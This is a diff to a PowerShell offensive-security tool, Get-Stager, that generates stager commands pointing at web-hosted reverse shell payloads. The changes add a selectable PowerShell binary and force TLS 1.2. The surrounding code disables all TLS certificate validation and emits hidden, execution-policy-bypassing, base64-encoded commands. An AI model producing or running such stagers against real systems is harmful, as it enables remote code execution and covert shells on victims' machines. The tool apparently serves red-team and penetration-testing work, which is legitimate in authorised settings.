@@ -1,7 +1,7 @@
 ﻿function Get-Stager {
 #.SYNOPSIS
 # Simple PowerShell stager generator to point to web hosted payloads.
-# ARBITRARY VERSION NUMBER:  3.0.0
+# ARBITRARY VERSION NUMBER:  3.5.0
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -18,6 +18,7 @@
 #   -PayloadURL  -->  URL pointing to the reverse shell payload
 #   -Command     -->  PowerShell command to execute instead of a reverse shell stager
 #   -Raw         -->  Return stager payload in cleartext rather than base64
+#   -Binary      -->  PowerShell binary to use (default: 'powershell')
 #   -Headless    -->  Create stager payload without '-' parameters
 #   -Help        -->  Return Get-Help information
 #
@@ -29,6 +30,7 @@
         [string]$PayloadURL = 'http(s)://<ip_addr>/<payload>',
         [string]$Command,
         [switch]$Raw,
+        [string]$Binary = 'powershell',
         [switch]$Headless,
         [switch]$Help
     )
@@ -56,13 +58,15 @@ using System.Net.Security;
 using System.Security.Cryptography.X509Certificates;
 public class SelfSignedCerts
 {
-    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
+    public static bool Bypass (Object obj, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
     {
         return true;
     }
     public static void WebClientBypass()
     {
         ServicePointManager.ServerCertificateValidationCallback = Bypass;
+        ServicePointManager.Expect100Continue = true;
+        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
     }
 }
 '@
@@ -83,13 +87,13 @@ Add-Type `$CertificateBypass
 
 
     # Toggle '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden' PowerShell Parameters
-    if (!$Headless) { $Head = ' -nop -ex bypass -wi h' } 
-    else            { $Head = $NULL                    }
+    if (!$Headless) { $BinParams = $Binary + ' -nop -ex bypass -wi h' } 
+    else            { $BinParams = $Binary                            }
 
 
      # Cleartext or Base64 Payload
-    if (!$Raw) { $FinalStager = "powershell$Head -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
-    else       { $FinalStager = "powershell$Head -c {$Stager}" }
+    if (!$Raw) { $FinalStager = "$BinParams -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
+    else       { $FinalStager = "$BinParams -c {$Stager}" }
 
 
     return $FinalStager
